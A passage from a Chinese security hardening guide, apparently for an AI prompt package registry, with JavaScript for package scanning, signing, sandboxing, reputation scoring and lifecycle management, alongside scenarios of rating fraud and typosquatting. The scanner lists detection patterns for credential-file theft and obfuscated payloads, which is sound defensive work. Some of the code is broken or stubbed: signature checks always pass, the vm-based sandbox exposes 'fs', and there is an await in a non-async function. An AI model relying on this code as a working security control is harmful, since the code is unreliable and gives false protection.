          message: `请求了危险权限: ${perm}`,
        });
      }
    }
  
    return issues;
  }

  // 扫描网络活动（静态分析）
  async scanNetworkActivity(packageName, version) {
    const issues = [];
  
    // 下载包代码
    const code = await this.fetchPackageCode(packageName, version);
  
    // 检查网络请求
    const networkPatterns = [
      /fetch\(/i,
      /axios\./i,
      /http\.request/i,
      /https\.request/i,
      /XMLHttpRequest/i,
    ];
  
    for (const pattern of networkPatterns) {
      if (pattern.test(code)) {
        issues.push({
          severity: 'info',
          type: 'network-activity',
          message: '包含网络请求代码',
        });
        break;
      }
    }
  
    // 检查可疑域名
    const suspiciousDomains = [
      /pastebin\.com/i,
      /bit\.ly/i,
      /tinyurl\.com/i,
      // ... 更多可疑域名
    ];
  
    for (const pattern of suspiciousDomains) {
      if (pattern.test(code)) {
        issues.push({
          severity: 'warning',
          type: 'suspicious-domain',
          message: '包含可疑域名',
        });
      }
    }
  
    return issues;
  }

  // 扫描文件访问
  async scanFileAccess(packageName, version) {
    const issues = [];
    const code = await this.fetchPackageCode(packageName, version);
  
    const sensitiveFiles = [
      /\.ssh\/id_rsa/i,
      /\.aws\/credentials/i,
      /\.npmrc/i,
      /\.gitconfig/i,
      /\.env/i,
    ];
  
    for (const pattern of sensitiveFiles) {
      if (pattern.test(code)) {
        issues.push({
          severity: 'critical',
          type: 'sensitive-file-access',
          message: '尝试访问敏感文件',
        });
      }
    }
  
    return issues;
  }

  // 扫描代码混淆
  async scanObfuscation(packageName, version) {
    const issues = [];
    const code = await this.fetchPackageCode(packageName, version);
  
    // 检查混淆特征
    const obfuscationPatterns = [
      /eval\(atob\(/i,
      /eval\(unescape\(/i,
      /Function\(.*\)\(/i,
      /\\x[0-9a-f]{2}/gi,  // 十六进制编码
    ];
  
    for (const pattern of obfuscationPatterns) {
      if (pattern.test(code)) {
        issues.push({
          severity: 'warning',
          type: 'code-obfuscation',
          message: '代码可能被混淆',
        });break;
      }
    }
  
    // 检查代码熵（高熵 = 可能混淆）
    const entropy = this.calculateEntropy(code);
    if (entropy > 5.0) {
      issues.push({
        severity: 'info',
        type: 'high-entropy',
        message: `代码熵值较高 (${entropy.toFixed(2)})，可能被混淆`,
      });
    }
  
    return issues;
  }

  // 计算字符串熵
  calculateEntropy(str) {
    const freq = {};
    for (const char of str) {
      freq[char] = (freq[char] || 0) + 1;
    }
  
    let entropy = 0;
    const len = str.length;
  
    for (const count of Object.values(freq)) {
      const p = count / len;
      entropy -= p * Math.log2(p);
    }
  
    return entropy;
  }

  // 获取包代码（模拟）
  async fetchPackageCode(packageName, version) {
    // 实际应该从 Git 仓库下载
    return '';
  }

  // 加载安全规则
  loadSecurityRules() {
    return {
      // 规则定义
    };
  }
}


// ============================================
// 包签名和验证
// ============================================
class PackageSignature {
  constructor() {
    this.trustedKeys = new Map();
  }

  // 验证包签名
  async verify(packageName, version, signature) {
    // 获取包内容
    const content = await this.fetchPackageContent(packageName, version);
  
    // 计算哈希
    const hash = this.calculateHash(content);
  
    // 验证签名
    const publisher = this.extractPublisher(signature);
    const publicKey = this.trustedKeys.get(publisher);
  
    if (!publicKey) {
      throw new Error(`未知的发布者: ${publisher}`);
    }
  
    const valid = this.verifySignature(hash, signature, publicKey);
  
    if (!valid) {
      throw new Error(`签名验证失败: ${packageName}@${version}`);
    }
  
    return { valid: true, publisher };
  }

  // 计算内容哈希
  calculateHash(content) {
    const crypto = require('crypto');
    return crypto.createHash('sha256').update(content).digest('hex');
  }

  // 验证签名（简化）
  verifySignature(hash, signature, publicKey) {
    // 实际应该使用 crypto 库验证
    return true;
  }

  // 提取发布者
  extractPublisher(signature) {
    // 从签名中提取发布者信息
    return 'unknown';
  }

  // 获取包内容
  async fetchPackageContent(packageName, version) {
    return '';
  }
}


// ============================================
// 沙箱执行环境
// ============================================
class PackageSandbox {
  constructor() {
    this.restrictions = {
      network: false,
      filesystem: 'read-only',
      process: 'no-spawn',
      env: 'limited',
    };
  }

  // 在沙箱中执行安装脚本
  async executeScript(script, restrictions = this.restrictions) {
    console.log('🔒 在沙箱中执行脚本...');
  
    // 创建隔离环境
    const sandbox = {
      console: {
        log: (...args) => console.log('[SANDBOX]', ...args),
        error: (...args) => console.error('[SANDBOX]', ...args),
      },
      // 限制的 API
      fetch: restrictions.network ? fetch : () => {
        throw new Error('网络访问被禁止');
      },
      require: (module) => {
        if (this.isAllowedModule(module)) {
          return require(module);
        }
        throw new Error(`模块 ${module} 不被允许`);
      },
    };
  
    // 执行脚本
    try {
      const vm = require('vm');
      const context = vm.createContext(sandbox);
      vm.runInContext(script, context, { timeout: 5000 });
    
      console.log('✓ 脚本执行完成\n');
    } catch (e) {
      throw new Error(`脚本执行失败: ${e.message}`);
    }
  }

  // 检查模块是否被允许
  isAllowedModule(module) {
    const allowed = ['path', 'fs', 'os'];
    return allowed.includes(module);
  }
}


// ============================================
// 使用示例
// ============================================
async function installPackageSecurely(packageName, version) {
  const scanner = new PackageSecurityScanner();
  const signature = new PackageSignature();
  const sandbox = new PackageSandbox();

  try {
    // 1. 获取包信息
    const manifest = await fetchManifest(packageName, version);
  
    // 2. 安全扫描
    console.log(`🔍 扫描包: ${packageName}@${version}...`);
    const scanResult = await scanner.scan(packageName, version, manifest);
  
    if (!scanResult.safe) {
      console.error('❌ 安全扫描失败:\n');
      scanResult.issues
        .filter(i => i.severity === 'critical')
        .forEach(issue => {
          console.error(`  - ${issue.message}`);
        });
    
      const proceed = await promptUser('是否继续安装？(y/N)');
      if (proceed !== 'y') {
        return;
      }
    }
  
    // 显示警告
    const warnings = scanResult.issues.filter(i => i.severity === 'warning');
    if (warnings.length > 0) {
      console.log('\n⚠️  警告:');
      warnings.forEach(w => console.log(`  - ${w.message}`));
      console.log('');
    }
  
    // 3. 验证签名
    if (manifest.signature) {
      console.log('🔐 验证包签名...');
      await signature.verify(packageName, version, manifest.signature);
      console.log('✓ 签名验证通过\n');
    } else {
      warn('⚠️  包未签名，无法验证发布者身份');
    }
  
    // 4. 在沙箱中执行安装脚本
    if (manifest.scripts && manifest.scripts.postinstall) {
      console.log('📦 执行安装脚本...');
      await sandbox.executeScript(manifest.scripts.postinstall);}
  
    // 5. 安装包
    console.log(`📥 安装 ${packageName}@${version}...`);
    await installPackage(packageName, version);
  
    console.log('✅ 安装完成\n');
  
  } catch (e) {
    console.error(`❌ 安装失败: ${e.message}\n`);
    throw e;
  }
}
```

---

## 💥 攻击场景 5.4：包发现和推荐的操纵

包发现和推荐系统如果设计不当，可能被恶意利用来推广恶意包或压制竞争对手。主要问题：
1. 评分操纵
2. 搜索结果操纵
3. 推荐算法偏见
4. 虚假评论和下载量
5. SEO 操纵

```
场景 A — 评分操纵
────────────────

恶意开发者创建大量假账户
给自己的包刷 5 星好评
给竞争对手的包刷 1 星差评

问题:
  评分系统失去可信度
  用户无法判断包的真实质量
  优质包被埋没


场景 B — 下载量造假
──────────────────

恶意开发者使用脚本刷下载量
包 A 显示 100,000 次下载
实际只有 100 次真实下载

问题:
  下载量排序失效
  用户被误导选择流行度造假的包


场景 C — 搜索结果操纵
────────────────────

恶意包使用关键词堆砌:
  "ai prompt chatgpt gpt-4 openai claude llm nlp ml"

搜索任何相关词都会出现这个包

问题:
  搜索结果被垃圾包占据
  用户难以找到真正相关的包


场景 D — 虚假文档和示例
──────────────────────

恶意包提供精美的文档和示例
但实际功能与描述不符
或者包含隐藏的恶意代码

问题:
  用户被文档吸引
  安装后才发现问题


场景 E — 推荐算法偏见
────────────────────

推荐算法基于:
  - 下载量（可造假）
  - 评分（可操纵）
  - 关键词匹配（可堆砌）

结果:
  恶意包被推荐给更多用户
  形成恶性循环


场景 F — 社交工程推广
────────────────────

恶意开发者在社区中:
  - 发布"教程"推荐自己的包
  - 在 Stack Overflow 回答中植入链接
  - 在 GitHub issue 中推荐

问题:
  用户信任社区推荐
  不会仔细审查


场景 G — 品牌混淆
────────────────

恶意包使用相似的名称和图标:
  官方包: "aiforge-prompts"
  恶意包: "aiforge-prompt" (少一个 s)

使用相似的描述和截图

问题:
  用户难以区分
  误以为是官方包


场景 H — 废弃包占位
──────────────────

开发者注册流行的包名
但从不发布实际内容
只是占位等待出售

问题:
  好的包名被占用
  真正的开发者无法使用


场景 I — 付费推广
────────────────

如果平台支持付费推广:恶意包可以购买广告位
  出现在搜索结果顶部

问题:
  付费 ≠ 质量
  用户可能被误导


场景 J — 推荐系统的冷启动问题
────────────────────────────

新包没有下载量和评分
即使质量很高也不会被推荐

问题:
  新包难以获得曝光
  生态缺乏活力
```

### 加固方案

```javascript
// ============================================
// 包评分和信誉系统
// ============================================
class PackageReputationSystem {
  constructor() {
    this.scores = new Map();
    this.reviews = new Map();
    this.verifiedPublishers = new Set();
  }

  // 计算包的综合评分
  calculateScore(packageName) {
    const metrics = {
      quality: this.calculateQualityScore(packageName),
      security: this.calculateSecurityScore(packageName),
      maintenance: this.calculateMaintenanceScore(packageName),
      community: this.calculateCommunityScore(packageName),
      trust: this.calculateTrustScore(packageName),
    };
  
    // 加权平均
    const weights = {
      quality: 0.25,
      security: 0.30,  // 安全性权重最高
      maintenance: 0.20,
      community: 0.15,
      trust: 0.10,
    };
  
    let totalScore = 0;
    for (const [metric, score] of Object.entries(metrics)) {
      totalScore += score * weights[metric];
    }
  
    return {
      total: totalScore,
      breakdown: metrics,
    };
  }

  // 质量评分（基于代码质量、文档等）
  calculateQualityScore(packageName) {
    let score = 0;
  
    // 有完整的 README (+20)
    if (this.hasReadme(packageName)) score += 20;
  
    // 有示例代码 (+15)
    if (this.hasExamples(packageName)) score += 15;
  
    // 有测试 (+15)
    if (this.hasTests(packageName)) score += 15;
  
    // 有 TypeScript 类型定义 (+10)
    if (this.hasTypes(packageName)) score += 10;
  
    // 代码覆盖率 > 80% (+20)
    const coverage = this.getCodeCoverage(packageName);
    if (coverage > 80) score += 20;
    else if (coverage > 50) score += 10;
  
    // 有 CI/CD (+10)
    if (this.hasCI(packageName)) score += 10;
  
    // 代码质量检查通过 (+10)
    if (this.passesLinting(packageName)) score += 10;
  
    return Math.min(score, 100);
  }

  // 安全评分
  calculateSecurityScore(packageName) {
    let score = 100;
  
    // 有已知漏洞 (-50 per vulnerability)
    const vulns = this.getVulnerabilities(packageName);
    score -= vulns.length * 50;
  
    // 使用了危险的 API (-20)
    if (this.usesDangerousAPIs(packageName)) score -= 20;
  
    // 没有签名 (-10)
    if (!this.isSigned(packageName)) score -= 10;
  
    // 请求了过多权限 (-15)
    if (this.requestsExcessivePermissions(packageName)) score -= 15;
  
    // 包含混淆代码 (-25)
    if (this.hasObfuscatedCode(packageName)) score -= 25;
  
    return Math.max(score, 0);
  }

  // 维护评分
  calculateMaintenanceScore(packageName) {
    let score = 0;
  
    // 最近更新时间
    const daysSinceUpdate = this.getDaysSinceLastUpdate(packageName);
    if (daysSinceUpdate < 30) score += 30;
    else if (daysSinceUpdate < 90) score += 20;
    else if (daysSinceUpdate < 180) score += 10;
    // 更新频率
    const updatesPerYear = this.getUpdatesPerYear(packageName);
    if (updatesPerYear > 12) score += 20;
    else if (updatesPerYear > 6) score += 15;
    else if (updatesPerYear > 3) score += 10;
  
    // Issue 响应时间
    const avgResponseTime = this.getAvgIssueResponseTime(packageName);
    if (avgResponseTime < 24) score += 20;  // 24小时内
    else if (avgResponseTime < 72) score += 15;
    else if (avgResponseTime < 168) score += 10;
  
    // 有活跃的维护者 (+15)
    if (this.hasActiveMainers(packageName)) score += 15;
  
    // 遵循语义化版本 (+15)
    if (this.followsSemver(packageName)) score += 15;
  
    return Math.min(score, 100);
  }

  // 社区评分
  calculateCommunityScore(packageName) {
    let score = 0;
  
    // GitHub stars (对数缩放)
    const stars = this.getGitHubStars(packageName);
    score += Math.min(Math.log10(stars + 1) * 15, 30);
  
    // 真实下载量（去除机器人）
    const downloads = this.getVerifiedDownloads(packageName);
    score += Math.min(Math.log10(downloads + 1) * 10, 25);
  
    // 依赖此包的项目数量
    const dependents = this.getDependentsCount(packageName);
    score += Math.min(Math.log10(dependents + 1) * 10, 20);
  
    // 贡献者数量
    const contributors = this.getContributorsCount(packageName);
    score += Math.min(contributors * 2, 15);
  
    // 有活跃的社区讨论 (+10)
    if (this.hasActiveCommunity(packageName)) score += 10;
  
    return Math.min(score, 100);
  }

  // 信任评分
  calculateTrustScore(packageName) {
    let score = 50;  // 基础分
  
    // 发布者是验证用户 (+30)
    if (this.isVerifiedPublisher(packageName)) score += 30;
  
    // 包已存在超过 1 年 (+10)
    const age = this.getPackageAge(packageName);
    if (age > 365) score += 10;
  
    // 没有被举报 (+10)
    if (!this.hasReports(packageName)) score += 10;
  
    // 有安全审计 (+20)
    if (this.hasSecurityAudit(packageName)) score += 20;
  
    // 被其他可信包依赖 (+10)
    if (this.isTrustedByOthers(packageName)) score += 10;
  
    // 有负面报告 (-30 per report)
    const reports = this.getNegativeReports(packageName);
    score -= reports.length * 30;
  
    return Math.max(Math.min(score, 100), 0);
  }

  // 检测虚假评分
  detectFakeRatings(packageName) {
    const reviews = this.getReviews(packageName);
    const suspicious = [];
  
    // 1. 检查评分分布（真实评分通常是正态分布）
    const distribution = this.getRatingDistribution(reviews);
    if (distribution[5] > 0.8) {  // 80% 都是 5 星
      suspicious.push('评分分布异常（过多 5 星）');
    }
  
    // 2. 检查评论时间（短时间内大量评论）
    const timeSpan = this.getReviewTimeSpan(reviews);
    if (timeSpan < 24 && reviews.length > 50) {
      suspicious.push('短时间内大量评论');
    }
  
    // 3. 检查评论者账户年龄
    const newAccounts = reviews.filter(r => 
      this.getAccountAge(r.userId) < 7  // 7天内注册
    ).length;
  
    if (newAccounts / reviews.length > 0.5) {
      suspicious.push('大量新账户评论');
    }
  
    // 4. 检查评论内容相似度
    const similarity = this.calculateReviewSimilarity(reviews);
    if (similarity > 0.7) {
      suspicious.push('评论内容高度相似');
    }
  
    // 5. 检查评论者的其他评论
    const singleReviewers = reviews.filter(r =>
      this.getUserReviewCount(r.userId) === 1
    ).length;
  
    if (singleReviewers / reviews.length > 0.6) {
      suspicious.push('大量用户只评论了这一个包');
    }
  
    return {
      isSuspicious: suspicious.length > 0,
      reasons: suspicious,
      confidence: suspicious.length / 5,  // 0-1
    };
  }

  // 检测下载量造假
  detectFakeDownloads(packageName) {
    const downloads = this.getDownloadStats(packageName);
    const suspicious = [];
  
    // 1. 检查下载量突增
    const spikes = this.detectDownloadSpikes(downloads);
    if (spikes.length > 0) {
      suspicious.push(`检测到 ${spikes.length} 次异常下载量突增`);
    }
  
    // 2. 检查下载来源
    const sources = this.getDownloadSources(packageName);
    const singleIPRatio = sources.singleIP / sources.total;
    if (singleIPRatio > 0.3) {
      suspicious.push('大量下载来自少数 IP');
    }
  
    // 3. 检查下载后的使用率
    const usageRate = this.getUsageRate(packageName);
    if (usageRate < 0.1) {  // 只有 10% 的下载实际使用
      suspicious.push('下载后使用率异常低');
    }
  
    // 4. 检查下载时间模式
    const pattern = this.analyzeDownloadPattern(downloads);
    if (pattern.isRobotic) {
      suspicious.push('下载时间模式类似机器人');
    }
  
    return {
      isSuspicious: suspicious.length > 0,
      reasons: suspicious,
      confidence: suspicious.length / 4,
    };
  }

  // 模拟方法（实际需要实现）
  hasReadme(pkg) { return true; }
  hasExamples(pkg) { return true; }
  hasTests(pkg) { return true; }
  hasTypes(pkg) { return false; }
  getCodeCoverage(pkg) { return 0; }
  hasCI(pkg) { return false; }
  passesLinting(pkg) { return true; }
  getVulnerabilities(pkg) { return []; }
  usesDangerousAPIs(pkg) { return false; }
  isSigned(pkg) { return false; }
  requestsExcessivePermissions(pkg) { return false; }
  hasObfuscatedCode(pkg) { return false; }
  getDaysSinceLastUpdate(pkg) { return 30; }
  getUpdatesPerYear(pkg) { return 6; }
  getAvgIssueResponseTime(pkg) { return 48; }
  hasActiveMaintainers(pkg) { return true; }
  followsSemver(pkg) { return true; }
  getGitHubStars(pkg) { return 100; }
  getVerifiedDownloads(pkg) { return 1000; }
  getDependentsCount(pkg) { return 10; }
  getContributorsCount(pkg) { return 3; }
  hasActiveCommunity(pkg) { return false; }
  isVerifiedPublisher(pkg) { return false; }
  getPackageAge(pkg) { return 180; }
  hasReports(pkg) { return false; }
  hasSecurityAudit(pkg) { return false; }
  isTrustedByOthers(pkg) { return false; }
  getNegativeReports(pkg) { return []; }
  getReviews(pkg) { return []; }
  getRatingDistribution(reviews) { return {}; }
  getReviewTimeSpan(reviews) { return 100; }
  getAccountAge(userId) { return 30; }
  calculateReviewSimilarity(reviews) { return 0.3; }
  getUserReviewCount(userId) { return 5; }
  getDownloadStats(pkg) { return []; }
  detectDownloadSpikes(stats) { return []; }
  getDownloadSources(pkg) { return { singleIP: 0, total: 1000 }; }
  getUsageRate(pkg) { return 0.5; }
  analyzeDownloadPattern(stats) { return { isRobotic: false }; }
}


// ============================================
// 智能搜索和推荐系统
// ============================================
class PackageSearchEngine {
  constructor() {
    this.index = new Map();
    this.reputationSystem = new PackageReputationSystem();
  }

  // 搜索包
  search(query, options = {}) {
    const {
      limit = 20,
      offset = 0,
      sortBy = 'relevance',  // relevance, downloads, rating, updated
      filters = {},
    } = options;
  
    // 1. 文本搜索
    let results = this.textSearch(query);
  
    // 2. 应用过滤器
    results = this.applyFilters(results, filters);
  
    // 3. 计算相关性分数
    results = results.map(pkg => ({
      ...pkg,
      relevance: this.calculateRelevance(pkg, query),
      reputation: this.reputationSystem.calculateScore(pkg.name),
    }));
  
    // 4. 排序
    results = this.sortResults(results, sortBy);
  
    // 5. 分页
    return results.slice(offset, offset + limit);
  }

  // 文本搜索
  textSearch(query) {
    const tokens = this.tokenize(query);
    const results = [];
  
    for (const [name, pkg] of this.index) {
      const score = this.matchScore(tokens, pkg);
      if (score > 0) {
        results.push({ ...pkg, matchScore: score });
      }
    }
  
    return results;
  }

  // 计算匹配分数
  matchScore(tokens, pkg) {
    let score = 0;
  
    // 包名匹配（权重最高）
    for (const token of tokens) {
      if (pkg.name.toLowerCase().includes(token)) {
        score += 10;
      }
    }
  
    // 描述匹配
    for (const token of tokens) {
      if (pkg.description.toLowerCase().includes(token)) {
        score += 3;
      }
    }
  
    // 关键词匹配
    for (const token of tokens) {
      if (pkg.keywords && pkg.keywords.includes(token)) {
        score += 5;
      }
    }
  
    // 惩罚关键词堆砌
    if (pkg.keywords && pkg.keywords.length > 20) {
      score *= 0.5;
    }
  
    return score;
  }

  // 计算相关性（综合多个因素）
  calculateRelevance(pkg, query) {
    let score = pkg.matchScore || 0;
  
    // 考虑包的信誉
    score += pkg.reputation.total * 0.3;
  
    // 考虑下载量（对数缩放）
    const downloads = this.getDownloads(pkg.name);
    score += Math.log10(downloads + 1) * 2;
  
    // 考虑更新时间（越新越好）
    const daysSinceUpdate = this.getDaysSinceUpdate(pkg.name);
    if (daysSinceUpdate < 30) score += 5;
    else if (daysSinceUpdate < 90) score += 3;
  
    // 惩罚可疑包
    const fakeRatings = this.reputationSystem.detectFakeRatings(pkg.name);
    if (fakeRatings.isSuspicious) {
      score *= (1 - fakeRatings.confidence * 0.5);
    }
  
    const fakeDownloads = this.reputationSystem.detectFakeDownloads(pkg.name);
    if (fakeDownloads.isSuspicious) {
      score *= (1 - fakeDownloads.confidence * 0.5);
    }
  
    return score;
  }

  // 推荐相似包
  recommendSimilar(packageName, limit = 5) {
    const pkg = this.index.get(packageName);
    if (!pkg) return [];
  
    const candidates = [];
  
    for (const [name, candidate] of this.index) {
      if (name === packageName) continue;
    
      const similarity = this.calculateSimilarity(pkg, candidate);
      candidates.push({ ...candidate, similarity });
    }
  
    // 按相似度排序
    candidates.sort((a, b) => b.similarity - a.similarity);
  
    return candidates.slice(0, limit);
  }

  // 计算包相似度
  calculateSimilarity(pkg1, pkg2) {
    let score = 0;
  
    // 关键词重叠
    if (pkg1.keywords && pkg2.keywords) {
      const overlap = pkg1.keywords.filter(k => 
        pkg2.keywords.includes(k)
      ).length;
      score += overlap * 5;
    }
  
    // 类别相同
    if (pkg1.category === pkg2.category) {
      score += 10;
    }
  
    // 依赖重叠
    const depOverlap = this.calculateDependencyOverlap(pkg1, pkg2);
    score += depOverlap * 3;
  
    return score;
  }

  // 辅助方法
  tokenize(query) {
    return query.toLowerCase().split(/\s+/);
  }

  applyFilters(results, filters) {
    return results.filter(pkg => {
      if (filters.category && pkg.category !== filters.category) {
        return false;
      }
      if (filters.minRating && pkg.rating < filters.minRating) {
        return false;
      }
      if (filters.verified && !pkg.verified) {
        return false;
      }
      return true;
    });
  }

  sortResults(results, sortBy) {
    switch (sortBy) {
      case 'relevance':
        return results.sort((a, b) => b.relevance - a.relevance);
      case 'downloads':
        return results.sort((a, b) => 
          this.getDownloads(b.name) - this.getDownloads(a.name)
        );
      case 'rating':
        return results.sort((a, b) => 
          b.reputation.total - a.reputation.total
        );
      case 'updated':
        return results.sort((a, b) => 
          this.getLastUpdate(b.name) - this.getLastUpdate(a.name)
        );
      default:
        return results;
    }
  }

  getDownloads(pkg) { return 1000; }
  getDaysSinceUpdate(pkg) { return 30; }
  getLastUpdate(pkg) { return Date.now(); }
  calculateDependencyOverlap(pkg1, pkg2) { return 0; }
}
```

---

## 💥 攻击场景 5.5：生态系统的长期健康

生态系统的长期健康涉及：
1. 包的废弃和维护
2. 社区治理
3. 标准和最佳实践
4. 生态系统的可持续性
5. 避免单点故障

```
场景 A — 关键包被废弃
──────────────────────

流行包 A 被 1000+ 项目依赖
维护者失去兴趣，停止维护
包含安全漏洞但无人修复

问题:
  依赖此包的项目面临风险
  生态系统出现单点故障


场景 B — 维护者消失
──────────────────

包维护者突然消失（生病、去世、失联）
没有其他人有权限发布新版本
包无法更新

问题:
  包被"冻结"
  无法修复 bug 和漏洞


场景 C — 包名抢注
────────────────

开发者注册大量包名但不发布内容
等待有人出价购买

问题:
  好的包名被占用
  阻碍生态发展


场景 D — 标准碎片化
──────────────────

不同的包使用不同的约定:
  - 配置格式
  - API 风格
  - 文件结构

问题:
  用户学习成本高
  包之间难以互操作


场景 E — 重复造轮子
──────────────────

多个包实现相同功能
但互不兼容
用户不知道选哪个

问题:
  资源浪费
  生态碎片化


场景 F — 缺乏治理
────────────────

没有明确的规则和流程:
  - 如何处理恶意包
  - 如何解决争议
  - 如何废弃包

问题:
  混乱无序
  用户失去信任


场景 G — 商业化冲突
──────────────────

开源包突然变成商业软件
或者添加了限制性许可证

问题:
  依赖此包的项目被迫迁移
  社区分裂


场景 H — 平台依赖
────────────────

所有包都托管在 GitLab
如果 GitLab 出问题:
  - 服务中断
  - 政策变更
  - 价格上涨

问题:
  单点故障
  缺乏备份方案


场景 I — 质量下降
────────────────

为了快速发布，包质量下降:
  - 缺少测试
  - 文档不完整
  - Bug 频繁

问题:
  用户体验差
  生态信誉受损


场景 J — 社区毒性
────────────────

社区出现恶意行为:
  - 人身攻击
  - 骚扰维护者
  - 恶意举报

问题:
  维护者离开
  新人不敢贡献
  生态衰退
```

### 加固方案

```javascript
// ============================================
// 包维护和生命周期管理
// ============================================
class PackageLifecycleManager {
  constructor() {
    this.packages = new Map();
    this.maintainers = new Map();
  }

  // 检查包的健康状态
  checkHealth(packageName) {
    const pkg = this.packages.get(packageName);
    const issues = [];
  
    // 1. 检查维护状态
    const daysSinceUpdate = this.getDaysSinceLastUpdate(packageName);
    if (daysSinceUpdate > 365) {
      issues.push({
        severity: 'warning',
        type: 'unmaintained',
        message: '包超过 1 年未更新',
      });
    }
  
    // 2. 检查维护者状态
    const maintainers = this.getMaintainers(packageName);
    if (maintainers.length === 1) {
      issues.push({
        severity: 'info',
        type: 'single-maintainer',
        message: '只有一个维护者（单点故障风险）',
      });
    }
  
    // 3. 检查依赖者数量
    const dependents = this.getDependentsCount(packageName);
    if (dependents > 100 && maintainers.length < 2) {
      issues.push({
        severity: 'warning',
        type: 'critical-package',
        message: '关键包但维护者不足',
      });
    }
  
    // 4. 检查未解决的 issue
    const openIssues = this.getOpenIssuesCount(packageName);
    if (openIssues > 50) {
      issues.push({
        severity: 'warning',
        type: 'many-issues',
        message: `有 ${openIssues} 个未解决的 issue`,
      });
    }
  
    // 5. 检查安全漏洞
    const vulns = this.getVulnerabilities(packageName);
    if (vulns.length > 0) {
      issues.push({
        severity: 'critical',
        type: 'vulnerabilities',
        message: `有 ${vulns.length} 个安全漏洞`,
      });
    }
  
    return {
      healthy: issues.filter(i => i.severity === 'critical').length === 0,
      issues,
    };
  }

  // 废弃包
  deprecatePackage(packageName, reason, alternative = null) {
    const pkg = this.packages.get(packageName);
  
    pkg.deprecated = true;
    pkg.deprecationReason = reason;
    pkg.alternative = alternative;
    pkg.deprecatedAt = new Date();
  
    // 通知所有依赖者
    this.notifyDependents(packageName, {
      type: 'deprecation',
      message: `包 ${packageName} 已废弃: ${reason}`,alternative,
    });
  
    log(`✓ 包 ${packageName} 已标记为废弃`);
  }

  // 转移维护权
  transferOwnership(packageName, newMaintainer) {
    const pkg = this.packages.get(packageName);
    const currentMaintainers = pkg.maintainers || [];
  
    // 验证新维护者
    if (!this.isVerifiedUser(newMaintainer)) {
      throw new Error('新维护者必须是验证用户');
    }
  
    // 添加新维护者
    currentMaintainers.push(newMaintainer);
    pkg.maintainers = currentMaintainers;
  
    // 记录转移历史
    pkg.ownershipHistory = pkg.ownershipHistory || [];
    pkg.ownershipHistory.push({
      from: currentMaintainers[0],
      to: newMaintainer,
      at: new Date(),
    });
  
    log(`✓ 包 ${packageName} 的维护权已转移给 ${newMaintainer}`);
  }

  // 认领废弃包
  adoptPackage(packageName, newMaintainer) {

    // 检查包是否已废弃或长期未维护
    const pkg = this.packages.get(packageName);
  
    if (!pkg) {
      throw new Error(`包不存在: ${packageName}`);
    }
  
    const daysSinceUpdate = this.getDaysSinceLastUpdate(packageName);
    const isAbandoned = daysSinceUpdate > 365;
    const isDeprecated = pkg.deprecated === true;
  
    if (!isAbandoned && !isDeprecated) {
      throw new Error('只能认领已废弃或长期未维护的包');
    }
  
    // 验证新维护者资质
    const qualification = this.checkMaintainerQualification(newMaintainer);
    if (!qualification.qualified) {
      throw new Error(
        `不满足认领条件: ${qualification.reasons.join(', ')}`
      );
    }
  
    // 尝试联系原维护者（等待 30 天）
    const contactResult = await this.contactOriginalMaintainer(packageName);
  
    if (contactResult.responded) {
      if (contactResult.approved) {
        // 原维护者同意转移
        this.transferOwnership(packageName, newMaintainer);
      } else {
        throw new Error('原维护者拒绝了转移请求');
      }
    } else {
      // 原维护者 30 天未响应，自动批准
      log(`⚠️  原维护者 30 天未响应，自动批准认领`);
      this.transferOwnership(packageName, newMaintainer);
    }
  
    // 标记为已认领
    pkg.adopted = true;
    pkg.adoptedBy = newMaintainer;
    pkg.adoptedAt = new Date();
  
    // 通知社区
    this.notifyDependents(packageName, {
      type: 'adoption',
      message: `包 ${packageName} 已被 ${newMaintainer} 认领维护`,
    });
  
    log(`✓ 包 ${packageName} 已被 ${newMaintainer} 认领`);
  }

  // 检查维护者资质
  checkMaintainerQualification(userId) {
    const reasons = [];
  
    // 1. 账户年龄 > 6 个月
    const accountAge = this.getAccountAge(userId);
    if (accountAge < 180) {
      reasons.push('账户年龄不足 6 个月');
    }
  
    // 2. 至少维护过 1 个包
    const maintainedPackages = this.getMaintainedPackages(userId);
    if (maintainedPackages.length === 0) {
      reasons.push('没有维护过其他包');
    }
  
    // 3. 没有不良记录
    const violations = this.getViolations(userId);
    if (violations.length > 0) {
      reasons.push('有违规记录');
    }
  
    // 4. 身份已验证
    if (!this.isVerifiedUser(userId)) {
      reasons.push('身份未验证');
    }
  
    return {
      qualified: reasons.length === 0,
      reasons,
    };
  }

  // 监控关键包
  monitorCriticalPackages() {
    const criticalPackages = [];
  
    for (const [name, pkg] of this.packages) {
      const dependents = this.getDependentsCount(name);
      const maintainers = this.getMaintainers(name);
    
      // 被大量依赖但维护者很少的包 = 关键包
      if (dependents > 50 && maintainers.length <= 1) {
        criticalPackages.push({
          name,
          dependents,
          maintainers: maintainers.length,
          health: this.checkHealth(name),
          risk: this.calculateRisk(name),
        });
      }
    }
  
    // 按风险排序
    criticalPackages.sort((a, b) => b.risk - a.risk);
  
    if (criticalPackages.length > 0) {
      console.log('🚨 关键包风险报告:\n');
      criticalPackages.forEach(pkg => {
        console.log(`  ${pkg.name}`);
        console.log(`    依赖者: ${pkg.dependents}`);
        console.log(`    维护者: ${pkg.maintainers}`);
        console.log(`    风险等级: ${pkg.risk}/10`);
        console.log('');
      });
    }
  
    return criticalPackages;
  }

  // 计算风险等级
  calculateRisk(packageName) {
    let risk = 0;
  
    const daysSinceUpdate = this.getDaysSinceLastUpdate(packageName);
    const maintainers = this.getMaintainers(packageName);
    const dependents = this.getDependentsCount(packageName);
    const vulns = this.getVulnerabilities(packageName);
  
    // 更新时间越久风险越高
    if (daysSinceUpdate > 365) risk += 3;
    else if (daysSinceUpdate > 180) risk += 2;
    else if (daysSinceUpdate > 90) risk += 1;
  
    // 维护者越少风险越高
    if (maintainers.length === 0) risk += 3;
    else if (maintainers.length === 1) risk += 2;
  
    // 依赖者越多风险影响越大
    if (dependents > 1000) risk += 2;
    else if (dependents > 100) risk += 1;
  
    // 有漏洞风险最高
    risk += Math.min(vulns.length * 2, 4);
  
    return Math.min(risk, 10);
  }

  // 模拟方法
  getDaysSinceLastUpdate(pkg) { return 30; }
  getMaintainers(pkg) { return ['maintainer1']; }
  getDependentsCount(pkg) { return 10; }
  getOpenIssuesCount(pkg) { return 5; }
  getVulnerabilities(pkg) { return []; }
  isVerifiedUser(userId) { return true; }
  getAccountAge(userId) { return 365; }
  getMaintainedPackages(userId) { return []; }
  getViolations(userId) { return []; }
  notifyDependents(pkg, msg) {}
  async contactOriginalMaintainer(pkg) { return { responded: false }; }
}


// ============================================
// 包命名空间和防抢注系统
// ============================================
class PackageNamespace {
  constructor() {
    this.reserved = new Set();
